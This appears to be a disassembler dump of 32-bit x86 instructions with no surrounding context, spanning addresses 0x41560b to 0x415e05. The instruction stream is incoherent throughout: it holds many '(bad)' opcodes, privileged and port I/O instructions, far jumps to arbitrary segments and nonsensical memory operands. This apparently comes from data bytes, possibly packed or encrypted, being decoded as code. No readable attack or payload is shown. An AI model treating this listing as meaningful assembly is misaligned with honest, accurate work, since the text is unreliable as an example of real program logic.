  41560b:	cmp    BYTE PTR [eax+ecx*2-0x19],dh
  41560f:	cmc    
  415610:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415611:	shr    DWORD PTR [edi+0x304b7ea9],0xbc
  415618:	add    eax,0x787b2ab3
  41561d:	ins    BYTE PTR es:[edi],dx
  41561e:	sbb    al,0xfb
  415621:	jb     0x4155e3
  415623:	test   BYTE PTR [ecx-0x2b],al
  415626:	test   DWORD PTR [ecx],ebp
  415628:	sbb    BYTE PTR [edi],cl
  41562a:	inc    esi
  41562b:	ret    0xdac5
  41562e:	mov    esp,0xa2584a52
  415633:	dec    ecx
  415634:	cld    
  415635:	pop    edi
  415636:	sub    eax,0x4cf8ae79
  41563b:	mov    bh,bh
  41563d:	add    bl,BYTE PTR [eax+edi*2]
  415640:	(bad)  
  415641:	mov    edx,0x943ce932
  415646:	mov    ch,0xda
  415648:	jo     0x4155ca
  41564a:	out    dx,al
  41564b:	ds xchg edi,eax
  41564d:	jnp    0x415639
  41564f:	lods   eax,DWORD PTR ds:[esi]
  415650:	in     eax,0x20
  415652:	add    eax,0x7e303d66
  415657:	rol    BYTE PTR [edi+0x7028c05c],1
  41565d:	sahf   
  41565e:	mov    ch,dh
  415660:	dec    edx
  415661:	std    
  415662:	sub    dh,BYTE PTR [eax+0x13]
  415665:	jle    0x4156a3
  415667:	sbb    eax,0xb05340cd
  41566d:	lea    edx,[eax+0x3e1929d0]
  415673:	mov    DWORD PTR [eax+0x63],eax
  415676:	xchg   ebx,eax
  415677:	jnp    0x4156e0
  415679:	jae    0x415673
  41567b:	(bad)  
  41567c:	mov    edx,0xc5405931
  415681:	retf   
  415682:	or     eax,0x43869f71
  415687:	adc    al,0xfa
  415689:	mov    edx,esp
  41568b:	imul   ecx,DWORD PTR [ecx-0x445202e6],0x6c9c1363
  415695:	or     cl,ah
  415697:	(bad)  [edx-0x37a533fb]
  41569d:	xor    al,0x11
  41569f:	nop
  4156a0:	call   0x5b174bf3
  4156a5:	mov    dh,0x58
  4156a7:	aas    
  4156a8:	sub    eax,0xade115a
  4156ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156ae:	pop    edi
  4156af:	cli    
  4156b0:	and    BYTE PTR [edi],bl
  4156b2:	jle    0x415674
  4156b4:	(bad)  
  4156b5:	test   edx,0x83cdac82
  4156bb:	sub    edi,DWORD PTR [ebp+ebp*1-0x17]
  4156bf:	push   eax
  4156c0:	scas   eax,DWORD PTR es:[edi]
  4156c1:	adc    bh,BYTE PTR [edx+ebp*4-0x5cfe4c71]
  4156c8:	xor    al,0xf9
  4156ca:	cdq    
  4156cb:	cmp    esp,DWORD PTR fs:[ebx-0x3c72a3c6]
  4156d2:	(bad)  
  4156d3:	push   cs
  4156d4:	jg     0x41573f
  4156d6:	or     eax,0x2ea5391d
  4156db:	xor    BYTE PTR [edi-0x37],ch
  4156de:	jp     0x41567d
  4156e0:	inc    edx
  4156e1:	les    edx,FWORD PTR [eax]
  4156e3:	cmc    
  4156e4:	sbb    DWORD PTR ds:0x5194a78a,esp
  4156ea:	add    DWORD PTR [edi-0xc],ebx
  4156ed:	test   al,0xcb
  4156ef:	jle    0x41571c
  4156f1:	sub    al,0x4e
  4156f3:	mov    edi,0x5132cc80
  4156f8:	loope  0x4156a2
  4156fa:	pop    ds
  4156fb:	(bad)  
  4156fd:	jmp    0x219a1bf4
  415702:	cmp    edi,DWORD PTR [edx]
  415704:	jl     0x415701
  415706:	repz ror dl,0x5a
  41570a:	mov    fs,eax
  41570c:	jae    0x4156c6
  41570e:	fs jbe 0x4156a8
  415711:	out    0x83,al
  415713:	mov    al,ss:0x34ee9b2d
  415719:	mov    esi,0xe2864ee
  41571e:	cmp    DWORD PTR [esi],edi
  415720:	adc    DWORD PTR [ecx],edx
  415722:	inc    ebx
  415723:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415724:	jl     0x4156f1
  415726:	loopne 0x41578a
  415728:	jecxz  0x415783
  41572a:	inc    eax
  41572b:	push   esp
  41572c:	gs push 0xfffffff7
  41572f:	inc    esi
  415731:	xor    eax,0xf6c27eba
  415736:	pushf  
  415737:	ins    BYTE PTR es:[edi],dx
  415738:	xor    al,0xc7
  41573a:	stc    
  41573b:	repnz loopne 0x41579b
  41573e:	push   ds
  41573f:	xchg   edi,eax
  415740:	cld    
  415741:	cmp    BYTE PTR [ebx-0x6e],dh
  415744:	test   eax,0x335850b2
  415749:	rcl    BYTE PTR [ebp+0x20116c94],0xc2
  415750:	lods   eax,DWORD PTR ds:[esi]
  415751:	faddp  st(2),st
  415753:	pop    eax
  415754:	es mov ch,0xe9
  415757:	mov    dl,0xd2
  415759:	icebp  
  41575a:	retf   
  41575b:	out    dx,al
  41575c:	sbb    eax,0x1c492b2d
  415761:	daa    
  415762:	and    esi,DWORD PTR [ecx+0x58]
  415765:	cwde   
  415766:	sub    BYTE PTR ds:0xdccf1f97,dh
  41576c:	(bad)
  415770:	cmp    edx,DWORD PTR [edx+eiz*8]
  415773:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415774:	jmp    0xc829:0xf23a1786
  41577b:	push   ecx
  41577c:	inc    ecx
  41577d:	push   ebp
  41577e:	push   DWORD PTR [esi+ebp*8-0x1dbd7b7b]
  415785:	mov    bh,0x76
  415787:	test   al,0xe4
  415789:	sub    bh,BYTE PTR [eax+0x2f]
  41578c:	mov    ecx,0x116c0cd0
  415791:	jmp    0xf1de75a5
  415796:	pop    esi
  415797:	mov    BYTE PTR [ecx-0x69fae981],0xd9
  41579e:	mov    ebx,0x839f3ca0
  4157a3:	imul   ecx,DWORD PTR [ecx+0x17],0x27a817e7
  4157aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157ab:	rcl    BYTE PTR [eax+edi*4-0x1745491e],1
  4157b2:	repnz fcom DWORD PTR [ebx+0x78fa3318]
  4157b9:	les    ecx,FWORD PTR [ebp-0x54c2d275]
  4157bf:	sbb    dh,cl
  4157c1:	mov    edx,0x5d37e77e
  4157c6:	repz sub al,0x2f
  4157c9:	pop    edx
  4157ca:	(bad)  
  4157cb:	aam    0x99
  4157cd:	push   edi
  4157ce:	inc    ebx
  4157cf:	jmp    0x41580e
  4157d1:	jb     0x41576e
  4157d3:	and    eax,0xbb602b63
  4157d8:	jmp    0x3834621b
  4157dd:	mov    edx,0xb35e9f79
  4157e2:	(bad)  
  4157e3:	aas    
  4157e4:	(bad)  
  4157e5:	mov    esi,0x75cdae95
  4157ea:	mov    al,0x77
  4157ec:	aam    0xb2
  4157ee:	cmp    BYTE PTR [ebx-0x12f7c043],bl
  4157f4:	mov    ebp,fs
  4157f6:	sti    
  4157f7:	dec    ecx
  4157f8:	popf   
  4157f9:	xor    al,0x75
  4157fb:	dec    ebx
  4157fc:	inc    eax
  4157fd:	adc    dh,BYTE PTR [esi]
  4157ff:	or     DWORD PTR [ebx+0x3b],0xc65effd4
  415806:	fldenv [ecx+0x23]
  415809:	gs inc esi
  41580b:	jbe    0x4157d9
  41580d:	ret    0x6696
  415810:	dec    eax
  415811:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415812:	xor    al,0xc5
  415814:	gs inc edi
  415816:	test   eax,0x5444f3f4
  41581b:	repz xchg edx,eax
  41581d:	ins    BYTE PTR es:[edi],dx
  41581e:	lds    esi,FWORD PTR [edi]
  415820:	push   es
  415821:	mov    ds:0x5f9faf07,al
  415826:	mov    edi,0xea8a63e5
  41582b:	add    dh,BYTE PTR [edx+0x4d23bcb3]
  415831:	mov    ebp,0x1d2c24d9
  415836:	aaa    
  415837:	outs   dx,DWORD PTR ds:[esi]
  415838:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415839:	xlat   BYTE PTR ds:[ebx]
  41583a:	push   0xc205d9a9
  41583f:	pop    edx
  415840:	ret    0x9e41
  415843:	sub    cl,0xdd
  415846:	sar    al,0x8d
  415849:	inc    ecx
  41584a:	pop    edx
  41584b:	loop   0x4158c3
  41584d:	std    
  41584e:	call   0x4b7b5824
  415853:	or     eax,0x9b968ade
  415858:	sbb    DWORD PTR [ebp-0xb],esi
  41585b:	mov    al,0x42
  41585d:	lahf   
  41585e:	cdq    
  41585f:	pop    eax
  415860:	(bad)  
  415861:	imul   edi,ebp,0xffffff8b
  415864:	push   cs
  415865:	dec    ecx
  415866:	xchg   ebp,eax
  415867:	jae    0x415832
  415869:	int3   
  41586a:	jns    0x4158b5
  41586c:	mov    ebx,0x8f1c49c8
  415871:	xor    ah,bh
  415873:	aad    0x81
  415875:	das    
  415876:	push   cs
  415877:	or     DWORD PTR [edx],edx
  415879:	div    BYTE PTR [edi-0x7a9448d7]
  41587f:	xchg   ebx,eax
  415880:	popa   
  415881:	inc    edi
  415882:	jmp    0x3f72fb89
  415887:	pop    ebp
  415888:	loopne 0x415908
  41588a:	stos   DWORD PTR es:[edi],eax
  41588b:	or     ebx,DWORD PTR [eax*8-0x14da2076]
  415892:	lods   eax,DWORD PTR fs:[esi]
  415894:	pop    edx
  415895:	adc    al,BYTE PTR [edx+0x53c50fbf]
  41589b:	test   al,0x96
  41589d:	das    
  41589e:	push   ebx
  41589f:	xchg   ebp,eax
  4158a0:	data16 sbb ah,BYTE PTR [edi]
  4158a3:	jns    0x4158d8
  4158a5:	fwait
  4158a6:	jp     0x4158ba
  4158a8:	cli    
  4158a9:	cs xchg ebx,eax
  4158ab:	call   0x168:0x399e8eb4
  4158b2:	xchg   edi,eax
  4158b3:	mov    ecx,0x21d2a6df
  4158b8:	inc    ebp
  4158b9:	inc    edi
  4158ba:	mov    ebx,DWORD PTR [edi+0x60325e8]
  4158c0:	int    0x37
  4158c2:	pop    esp
  4158c3:	addr16 hlt 
  4158c5:	adc    al,0xaa
  4158c7:	dec    esi
  4158c8:	rcl    DWORD PTR [ebx-0x69558c65],0x91
  4158cf:	xchg   esi,eax
  4158d0:	jns    0x415898
  4158d2:	sub    eax,0xf14bf60
  4158d7:	and    esp,DWORD PTR [edi]
  4158d9:	cmp    BYTE PTR [ebx+0x285cb9a1],al
  4158df:	daa    
  4158e0:	call   0x9807:0x6a85ac8e
  4158e7:	xchg   ecx,eax
  4158e8:	mov    esi,0xe69296c
  4158ed:	adc    esi,DWORD PTR [eax]
  4158ef:	adc    DWORD PTR [edx],esp
  4158f1:	loope  0x41590e
  4158f3:	ret    0x72e
  4158f6:	test   ah,0x8f
  4158f9:	sti    
  4158fa:	dec    BYTE PTR [eax+eax*4+0x7d9a0571]
  415901:	invd   
  415903:	int3   
  415904:	adc    al,0xb0
  415906:	pop    esi
  415907:	add    esp,DWORD PTR [esi+0x74e71e1f]
  41590d:	jmp    0xe431:0xa55b0b6f
  415914:	dec    esi
  415915:	dec    esp
  415916:	mov    al,ds:0xbaf4b27b
  41591b:	mov    ch,0x48
  41591d:	push   ecx
  41591e:	clc    
  41591f:	xchg   esp,eax
  415920:	push   edx
  415921:	std    
  415922:	cmp    ah,BYTE PTR [eax+0x16]
  415925:	jbe    0x41594e
  415927:	leave  
  415928:	sar    BYTE PTR [edx+0x4d0af46a],cl
  41592e:	jmp    0x415997
  415930:	mov    ah,BYTE PTR [eax+edi*2+0x3fd7b578]
  415937:	out    dx,al
  415938:	es xchg bh,al
  41593b:	and    bl,BYTE PTR ds:0x8e475a26
  415941:	scas   al,BYTE PTR es:[edi]
  415942:	mov    bh,0x5a
  415944:	pop    eax
  415945:	cs popa 
  415947:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415948:	xor    BYTE PTR [eax+0x47],cl
  41594b:	mov    ds:0xa8f30270,eax
  415950:	sub    DWORD PTR [edx-0x6a876b2d],edi
  415956:	adc    bh,BYTE PTR [eax]
  415958:	cwde   
  415959:	loope  0x4158ef
  41595b:	pop    ebp
  41595c:	ins    DWORD PTR es:[edi],dx
  41595d:	pop    edi
  41595e:	inc    ecx
  41595f:	sahf   
  415960:	ficomp DWORD PTR [ebx+0xd]
  415963:	cmp    al,0xb1
  415965:	(bad)  
  415966:	push   ecx
  415967:	xor    al,0x45
  415969:	or     esi,edi
  41596b:	aaa    
  41596c:	add    ebx,DWORD PTR [esi-0x4995072c]
  415972:	ret    0x3c72
  415975:	and    eax,0x42ab5d03
  41597a:	lds    eax,FWORD PTR [edi-0x33]
  41597d:	and    eax,0xa4f4dca1
  415982:	in     al,dx
  415983:	push   0xffffffe9
  415985:	adc    DWORD PTR [ebp+edi*2+0x3a],ecx
  415989:	ret    0x81ce
  41598c:	xchg   ebp,eax
  41598d:	shl    ecx,1
  41598f:	(bad)
  415994:	pusha  
  415995:	faddp  st(5),st
  415997:	popf   
  415998:	(bad)  
  415999:	aad    0x35
  41599b:	jnp    0x4159c9
  41599d:	adc    DWORD PTR [edx-0x4],ebx
  4159a0:	fistp  WORD PTR [eax-0x5a]
  4159a3:	stos   DWORD PTR es:[edi],eax
  4159a4:	fdiv   DWORD PTR [edi-0x6211e0d1]
  4159aa:	mov    al,0xec
  4159ac:	sbb    eax,0x5a4d99b1
  4159b1:	cmp    eax,0x4af6efa0
  4159b6:	rcl    DWORD PTR [eax],1
  4159b8:	bound  ebp,QWORD PTR [edi+edi*4]
  4159bb:	dec    esp
  4159bc:	or     al,0x82
  4159be:	push   esp
  4159bf:	call   0x2a29435
  4159c4:	add    BYTE PTR [ecx+0x3d],bl
  4159c7:	mov    ch,ch
  4159c9:	and    cl,BYTE PTR [ebx-0x73]
  4159cc:	pop    edx
  4159cd:	clc    
  4159ce:	mov    eax,ds:0xa9ff3818
  4159d3:	(bad)  
  4159d4:	rol    esi,0xb4
  4159d7:	(bad)  
  4159d8:	pusha  
  4159d9:	adc    eax,0xf0cdbe85
  4159de:	inc    DWORD PTR [ebx+0x572c13c3]
  4159e4:	add    esi,ebx
  4159e6:	addr16 ds inc ecx
  4159e9:	aas    
  4159ea:	mov    ah,cl
  4159ec:	dec    eax
  4159ed:	jmp    0x415a17
  4159ef:	push   cs
  4159f0:	std    
  4159f1:	adc    DWORD PTR [eax],0xffffffdb
  4159f4:	aad    0xf2
  4159f6:	mov    ss,esi
  4159f8:	enter  0xf0c6,0x3b
  4159fc:	clc    
  4159fd:	dec    ebx
  4159fe:	aad    0xc6
  415a00:	out    0xb2,al
  415a02:	(bad)  
  415a03:	mov    al,0x92
  415a05:	inc    edi
  415a06:	in     al,0xc9
  415a08:	jle    0x415a4e
  415a0a:	sahf   
  415a0b:	inc    esi
  415a0c:	mov    ebp,0x463a134a
  415a11:	add    al,0x4c
  415a13:	inc    edx
  415a14:	xchg   esi,eax
  415a15:	sub    BYTE PTR [ecx+0x2b],dh
  415a18:	sub    esi,DWORD PTR [esp+eax*1-0x7f]
  415a1c:	stc    
  415a1d:	mov    ebx,0xbdd221a6
  415a22:	mov    bh,0xbe
  415a24:	test   al,0x1
  415a26:	xor    bl,BYTE PTR fs:[edi-0xc044aa]
  415a2d:	push   ds
  415a2e:	(bad)  
  415a2f:	mov    ebp,DWORD PTR [eax+ecx*2+0x3f458679]
  415a36:	les    edi,FWORD PTR [eax]
  415a38:	clc    
  415a39:	out    dx,eax
  415a3a:	fdiv   QWORD PTR [esp+edi*2-0x4b]
  415a3e:	les    edx,FWORD PTR [esi]
  415a40:	xor    ebx,0xffffff8f
  415a43:	adc    eax,0xd4a2f9f5
  415a48:	sub    al,0x88
  415a4a:	lods   al,BYTE PTR ds:[esi]
  415a4b:	lods   eax,DWORD PTR ds:[esi]
  415a4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a4d:	sar    BYTE PTR [ebp-0x4ba60cf9],1
  415a53:	loopne 0x415a25
  415a55:	push   edx
  415a56:	ins    BYTE PTR es:[edi],dx
  415a57:	test   BYTE PTR [ebx-0x3e],cl
  415a5a:	mov    bh,0xa6
  415a5c:	ret    0x4827
  415a5f:	xchg   edi,eax
  415a60:	icebp  
  415a61:	es iret 
  415a63:	adc    al,BYTE PTR [edi]
  415a65:	pop    ss
  415a66:	mov    gs,WORD PTR [eax+edi*2-0x3adc0624]
  415a6d:	add    eax,0x297a7f88
  415a72:	pop    edx
  415a73:	push   edx
  415a74:	pop    esi
  415a75:	retf   
  415a76:	push   ss
  415a77:	sub    ecx,DWORD PTR [esi+ebp*2-0x39]
  415a7b:	sub    al,0xc8
  415a7d:	jle    0x415a04
  415a7f:	sub    bh,BYTE PTR [edi+0x323cbc3b]
  415a85:	adc    al,0xa1
  415a87:	je     0x415ab5
  415a89:	sub    BYTE PTR [edi],cl
  415a8b:	sub    bl,ah
  415a8d:	loop   0x415a13
  415a8f:	dec    ebx
  415a90:	stos   BYTE PTR es:[edi],al
  415a91:	stos   DWORD PTR es:[edi],eax
  415a92:	push   ebx
  415a93:	mov    dl,0xab
  415a95:	inc    ebx
  415a96:	xor    eax,0x3e5713ad
  415a9b:	fwait
  415a9c:	jmp    0x1fd17355
  415aa1:	into   
  415aa2:	dec    ebx
  415aa3:	ror    BYTE PTR [edi+esi*2+0x6d],cl
  415aa7:	jnp    0x415a5d
  415aa9:	dec    ebx
  415aaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415aab:	jb     0x415b1d
  415aad:	pop    edi
  415aae:	adc    al,0xcc
  415ab0:	jb     0x415b28
  415ab2:	adc    DWORD PTR [edi+0x38],0xffffff86
  415ab6:	cwde   
  415ab7:	or     bl,0x81
  415aba:	xor    eax,0xb3d4d3f
  415abf:	out    dx,al
  415ac0:	pop    esi
  415ac1:	mov    al,0x45
  415ac3:	or     al,0x9e
  415ac5:	inc    eax
  415ac6:	cmp    DWORD PTR [esi+0x14d13e41],esp
  415acc:	pusha  
  415acd:	jae    0x415a5c
  415acf:	in     al,dx
  415ad0:	lods   eax,DWORD PTR ds:[esi]
  415ad1:	dec    esp
  415ad2:	loope  0x415a89
  415ad4:	and    DWORD PTR [ebx],ebp
  415ad6:	jmp    0x7dcf:0x8483b885
  415add:	adc    eax,0x94c97000
  415ae2:	jmp    0x37ede04
  415ae7:	out    dx,eax
  415ae8:	xchg   esp,eax
  415ae9:	fwait
  415aea:	daa    
  415aeb:	enter  0x8bd3,0x1c
  415aef:	sahf   
  415af0:	xchg   BYTE PTR [ecx],ah
  415af2:	xor    esp,ebp
  415af4:	mov    ds:0x162a48e9,eax
  415af9:	cmp    ebp,DWORD PTR [edx-0x3e56d80c]
  415aff:	and    edx,ebp
  415b01:	and    eax,0x6cd9fa11
  415b06:	mov    ds:0x521a293a,eax
  415b0b:	push   esp
  415b0c:	cmp    eax,0x1e8809a4
  415b11:	pop    ebx
  415b12:	fs xchg edi,eax
  415b14:	mov    WORD PTR [ebx],ss
  415b16:	adc    dl,ch
  415b18:	test   al,0x65
  415b1a:	or     eax,0x858e1fb8
  415b1f:	jge    0x415af3
  415b21:	mov    edi,0xacd52943
  415b26:	mov    edx,0xfead0a16
  415b2b:	test   eax,0x57b54071
  415b30:	jecxz  0x415b40
  415b32:	loop   0x415b70
  415b34:	scas   eax,DWORD PTR es:[edi]
  415b35:	mov    ah,0xf8
  415b37:	pop    ecx
  415b38:	or     DWORD PTR [ebx],0x392766b3
  415b3e:	pop    es
  415b3f:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b41:	sub    ch,BYTE PTR [edx+eax*4-0x9]
  415b45:	jb     0x415b4d
  415b47:	mov    bl,0x33
  415b49:	pop    edi
  415b4a:	jecxz  0x415ae9
  415b4c:	inc    esp
  415b4d:	in     eax,dx
  415b4e:	mov    cl,0x11
  415b50:	sti    
  415b51:	adc    BYTE PTR [eax+edx*4],ah
  415b54:	sub    eax,0x81ab88ad
  415b59:	pop    esp
  415b5a:	and    al,BYTE PTR [ebx+ecx*2-0x1eab3819]
  415b61:	mov    ds:0x1a4bec5b,al
  415b66:	fdiv   QWORD PTR ds:0x75e251a7
  415b6c:	mov    dh,0xe9
  415b6e:	leave  
  415b6f:	and    eax,0xd17d4d32
  415b74:	mov    ecx,0x77edfbc7
  415b79:	(bad)  
  415b7b:	test   al,0xfe
  415b7d:	nop
  415b7e:	mov    BYTE PTR [esp+ebx*2],0x71
  415b82:	mov    dh,0x52
  415b84:	adc    DWORD PTR [esi+0x31],0xdd3b8580
  415b8b:	pushf  
  415b8c:	js     0x415b1f
  415b8e:	jg     0x415bc5
  415b90:	jmp    0xc20dd44f
  415b95:	out    dx,al
  415b96:	scas   eax,DWORD PTR es:[edi]
  415b97:	mov    ecx,0xa90d18e2
  415b9c:	(bad)  
  415b9d:	jnp    0x415c0b
  415b9f:	dec    edx
  415ba0:	dec    edi
  415ba1:	fucomip st,st(1)
  415ba3:	(bad)
  415ba7:	test   al,0xde
  415ba9:	xor    ecx,DWORD PTR [ecx+ebp*8+0x5f]
  415bad:	adc    DWORD PTR [ebx],edi
  415baf:	fldenv [ecx]
  415bb1:	and    al,0x88
  415bb3:	ins    BYTE PTR es:[edi],dx
  415bb4:	sti    
  415bb5:	mov    cl,0xc2
  415bb7:	or     dl,0xef
  415bba:	loopne 0x415c0b
  415bbc:	inc    esi
  415bbd:	push   es
  415bbe:	xchg   ecx,eax
  415bbf:	jno    0x415c3c
  415bc1:	sar    edx,cl
  415bc3:	mov    edi,0x48701ece
  415bc8:	in     eax,0x74
  415bca:	sbb    dh,al
  415bcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415bcd:	lds    edx,FWORD PTR [ebp-0x4d521d17]
  415bd3:	xchg   ecx,eax
  415bd4:	cmp    eax,0x192daa0
  415bd9:	mov    ebp,0x69df07bd
  415bde:	popa   
  415bdf:	mov    dh,0xe
  415be1:	les    esp,FWORD PTR [ebp+ebp*8-0x5c7f964b]
  415be8:	mov    ds:0x9df0f50,eax
  415bed:	push   esp
  415bee:	sbb    ch,BYTE PTR [esi-0x3c43f14a]
  415bf4:	lea    edx,[ebx+ecx*8]
  415bf7:	out    dx,eax
  415bf8:	mov    dl,0xd9
  415bfa:	mov    al,BYTE PTR [ebx-0x2e]
  415bfd:	mov    bl,0x44
  415bff:	add    DWORD PTR [ebp-0x3435c2e0],esi
  415c05:	and    DWORD PTR [esi],0xffffffb8
  415c08:	jo     0x415bdb
  415c0a:	inc    ebx
  415c0b:	ret    0xf014
  415c0e:	and    esp,esp
  415c10:	pop    esi
  415c11:	jg     0x415c39
  415c13:	stos   BYTE PTR es:[edi],al
  415c14:	pusha  
  415c15:	fwait
  415c16:	jbe    0x415ba3
  415c18:	add    al,0x45
  415c1a:	mov    ebp,0x7606b520
  415c1f:	retf   0xca75
  415c22:	cmp    BYTE PTR [edi-0x78],0x20
  415c26:	fs popf 
  415c28:	imul   edx,DWORD PTR [ebx],0xffffffd8
  415c2b:	inc    edx
  415c2c:	xor    esp,DWORD PTR [esi]
  415c2e:	test   al,0xb3
  415c30:	sbb    DWORD PTR [edi+ecx*8-0x16],esp
  415c34:	inc    eax
  415c35:	mov    ds:0x2175e474,al
  415c3a:	pop    esp
  415c3b:	jmp    0x415c77
  415c3d:	bound  eax,QWORD PTR [esi+0x44]
  415c40:	xor    eax,esp
  415c42:	mov    dh,0x38
  415c44:	(bad)  
  415c45:	in     eax,dx
  415c46:	or     eax,0xe1f8c76b
  415c4b:	sub    BYTE PTR [edx+0x63],dh
  415c4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c4f:	repnz pop es
  415c51:	sub    BYTE PTR [ebp+0x21],cl
  415c54:	cmp    bl,BYTE PTR ds:0x4fa7f72e
  415c5a:	je     0x415ccf
  415c5c:	dec    ebp
  415c5d:	jp     0x415cd0
  415c5f:	adc    bl,al
  415c61:	jmp    0x4f25662d
  415c66:	sub    BYTE PTR [ecx+0x5052f73],cl
  415c6c:	mov    ah,0x2a
  415c6e:	add    al,BYTE PTR [ebp+0x65]
  415c71:	and    edi,DWORD PTR [ebx-0x4]
  415c74:	add    al,0xba
  415c76:	cld    
  415c77:	ret    0xa0f6
  415c7a:	cli    
  415c7b:	add    eax,0xf7a22e24
  415c80:	out    dx,al
  415c81:	mov    bh,0x59
  415c83:	outs   dx,BYTE PTR ds:[esi]
  415c84:	mov    es,WORD PTR [eax]
  415c86:	push   ss
  415c87:	dec    ebx
  415c88:	add    ebp,DWORD PTR [esi]
  415c8a:	rcl    BYTE PTR [ecx-0x65041d0f],1
  415c90:	push   0x1f
  415c92:	gs sti 
  415c94:	mov    cl,0x38
  415c96:	aam    0xfb
  415c98:	sti    
  415c99:	aad    0xb2
  415c9b:	scas   eax,DWORD PTR es:[edi]
  415c9c:	imul   BYTE PTR [ebx+0x7a]
  415c9f:	ds dec esi
  415ca1:	in     al,dx
  415ca2:	cmc    
  415ca3:	mov    WORD PTR ds:0xf1bb61be,ss
  415ca9:	loop   0x415c52
  415cab:	out    0xf5,al
  415cad:	or     ebx,eax
  415caf:	int    0xa7
  415cb1:	sub    BYTE PTR [edi+0x20],bh
  415cb4:	adc    al,0x6f
  415cb6:	push   0x7
  415cb8:	jmp    FWORD PTR [edx]
  415cba:	repz xor ebx,DWORD PTR [ecx+0x4fe8c750]
  415cc1:	sub    DWORD PTR [ebx+edi*8],0x9c1d68c7
  415cc8:	jne    0x415ce7
  415cca:	repz mov al,ds:0xead28efa
  415cd0:	adc    eax,0x3724855c
  415cd5:	or     eax,0x63cf5c79
  415cda:	xor    DWORD PTR [eax-0x568bbe21],edx
  415ce0:	or     DWORD PTR [ebx+0x33],ebx
  415ce3:	test   eax,0x56722e22
  415ce8:	pop    eax
  415ce9:	call   0x429d:0xdee0c8c5
  415cf0:	xor    DWORD PTR [ebx+0x17],ebx
  415cf3:	out    dx,al
  415cf4:	out    0xe2,al
  415cf6:	push   ebx
  415cf7:	jo     0x415d3a
  415cf9:	inc    ecx
  415cfa:	fsub   QWORD PTR [edi+0x75]
  415cfd:	mov    ebx,0xb1163dba
  415d02:	xor    bh,0xcb
  415d05:	ret    0x98ce
  415d08:	ror    BYTE PTR [esi],1
  415d0a:	out    dx,eax
  415d0b:	cmp    eax,0x491d2ecc
  415d10:	sub    al,0xd4
  415d12:	mul    BYTE PTR [edi+0x74]
  415d15:	xor    eax,0x23f9e973
  415d1a:	mov    ah,0x89
  415d1c:	mov    esp,0xb8643140
  415d21:	push   ebx
  415d22:	push   0x19c41308
  415d27:	sti    
  415d28:	fs dec edi
  415d2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d2b:	ja     0x415d39
  415d2d:	jae    0x415d38
  415d2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d30:	push   ecx
  415d31:	test   al,0x7f
  415d33:	sub    eax,0x5f2cbc34
  415d38:	add    eax,0x124eaa15
  415d3d:	cmc    
  415d3e:	cmp    dl,dl
  415d40:	sub    edi,DWORD PTR [ecx]
  415d42:	mul    BYTE PTR ds:0x8d719346
  415d48:	enter  0xafd9,0x68
  415d4c:	lods   eax,DWORD PTR ds:[esi]
  415d4d:	test   eax,0x9443f031
  415d52:	daa    
  415d53:	add    eax,0xd7ae5b0
  415d58:	inc    edi
  415d59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d5a:	jns    0x415dd5
  415d5c:	inc    eax
  415d5d:	add    BYTE PTR [esi+0x45],bh
  415d60:	jge    0x415d41
  415d62:	adc    eax,0x15afd8b0
  415d67:	lods   al,BYTE PTR ds:[esi]
  415d68:	lock mov BYTE PTR [edi+0x4d960b41],al
  415d6f:	loope  0x415d95
  415d71:	push   esp
  415d72:	pop    ds
  415d73:	cld    
  415d74:	jo     0x415d70
  415d76:	ins    DWORD PTR es:[edi],dx
  415d77:	jnp    0x415d3c
  415d79:	dec    ecx
  415d7a:	mov    ds:0x9fe96c78,al
  415d7f:	jns    0x415d3f
  415d81:	pop    edx
  415d82:	sbb    eax,0x8179a4a
  415d87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d88:	loop   0x415d65
  415d8a:	mov    DWORD PTR [ecx-0x26ceae83],esp
  415d90:	mov    ch,0xc3
  415d92:	adc    ebx,DWORD PTR [eax+0x74]
  415d95:	(bad)  
  415d96:	in     al,dx
  415d97:	xor    esp,DWORD PTR [ecx]
  415d99:	jbe    0x415dd3
  415d9b:	in     eax,0xbd
  415d9d:	mov    al,0x50
  415d9f:	xor    al,0x2c
  415da1:	xchg   ebx,eax
  415da2:	loope  0x415d49
  415da4:	and    cl,ch
  415da6:	or     DWORD PTR [eax-0x41],0x8dece334
  415dad:	ficomp DWORD PTR ds:0xfd0d37ad
  415db3:	rsqrtps xmm2,XMMWORD PTR [eax+0x32]
  415db7:	xchg   esp,eax
  415db8:	rcr    BYTE PTR [edi],1
  415dba:	push   ss
  415dbb:	retf   0xcdfa
  415dbe:	call   0xc453:0xfc1035d9
  415dc5:	sbb    BYTE PTR [esi],0x11
  415dc8:	pusha  
  415dc9:	imul   ecx,esi,0x5
  415dcc:	out    dx,eax
  415dcd:	imul   esp,eax,0x736c1ce2
  415dd3:	mov    edi,0xaca0879e
  415dd8:	jnp    0x415d7f
  415dda:	mov    edi,0x811bfd81
  415ddf:	ins    DWORD PTR es:[edi],dx
  415de0:	fcom   QWORD PTR [ecx+0x2d]
  415de3:	add    al,BYTE PTR [ebx+0x40b87aef]
  415de9:	pop    ds
  415dea:	(bad)  
  415deb:	mov    bh,0x77
  415ded:	arpl   WORD PTR [ecx],ax
  415def:	jb     0x415e01
  415df1:	scas   al,BYTE PTR es:[edi]
  415df2:	push   ds
  415df3:	jmp    0x415e68
  415df5:	rol    BYTE PTR [ebx+0x7],cl
  415df8:	add    ch,BYTE PTR [eax+0x66]
  415dfb:	popf   
  415dfc:	jb     0x415df2
  415dfe:	add    al,0x28
  415e00:	test   BYTE PTR [esi-0x57],ah
  415e03:	push   eax
  415e04:	popa   
  415e05:	hlt    
